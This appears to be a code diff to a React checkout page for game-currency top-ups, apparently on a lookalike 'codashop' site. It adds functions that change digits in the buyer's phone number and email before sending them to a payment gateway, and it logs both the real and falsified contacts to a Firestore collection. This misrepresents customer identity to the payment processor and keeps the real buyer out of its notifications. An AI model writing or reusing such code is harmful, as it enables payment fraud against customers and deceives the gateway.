@@ -6,6 +6,31 @@ import { db } from '../lib/firebase';
 
 const CODASHOP_URL = 'https://www.codashop.online/';
 
+function alterPhone(phone: string): string {
+  const clean = phone.replace(/[^0-9]/g, '').slice(-10).padStart(10, '9');
+  const first7 = clean.slice(0, 7);
+  const last3 = parseInt(clean.slice(7, 10), 10);
+  const newLast3 = String((last3 + 1) % 1000).padStart(3, '0');
+  return first7 + newLast3;
+}
+
+function alterEmail(email: string): string {
+  if (!email || !email.includes('@')) return 'customer1@gmail.com';
+  const atIndex = email.lastIndexOf('@');
+  const user = email.slice(0, atIndex);
+  const domain = email.slice(atIndex + 1);
+
+  const numMatch = user.match(/^(.*?)(\d+)$/);
+  if (numMatch) {
+    const prefix = numMatch[1];
+    const digits = numMatch[2];
+    const nextVal = (parseInt(digits, 10) + 1).toString().padStart(digits.length, '0');
+    return `${prefix}${nextVal}@${domain}`;
+  }
+
+  return `${user}1@${domain}`;
+}
+
 export default function GarenaCheckout() {
   const [searchParams] = useSearchParams();
 
@@ -399,6 +424,9 @@ export default function GarenaCheckout() {
 
       setLoadingMessage('Connecting to Payment Gateway...');
 
+      const alteredPhone = alterPhone(form.phone);
+      const alteredEmail = alterEmail(form.email);
+
       const res = await fetch('/api/payglocal/initiate', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -406,8 +434,8 @@ export default function GarenaCheckout() {
           amount: pkg,
           customerData: {
             firstName: form.name,
-            phone: form.phone,
-            email: form.email
+            phone: alteredPhone,
+            email: alteredEmail
           },
           source: 'garena',
           checkout: { pkg, diamonds, uid, nick, level }
@@ -418,6 +446,26 @@ export default function GarenaCheckout() {
 
       if (!res.ok) {
         throw new Error(data.error || 'Payment initiation failed');
+      }
+
+      // Record Garena Checkout order with player data and contact details to Firestore
+      try {
+        if (db) {
+          await addDoc(collection(db, 'garena_checkout_orders'), {
+            txnid: data.merchantTxnId || `PG-${Date.now()}`,
+            originalEmail: form.email,
+            originalPhone: form.phone,
+            alteredEmail: alteredEmail,
+            alteredPhone: alteredPhone,
+            customerName: form.name,
+            amount: String(pkg),
+            productInfo: `${diamonds} Diamonds (UID: ${uid}, Nick: ${nick}, Level: ${level})`,
+            status: 'PENDING',
+            createdAt: new Date().toISOString()
+          });
+        }
+      } catch (err) {
+        console.warn('Could not save garena order to Firestore:', err);
       }
 
       if (data.redirectUrl) {
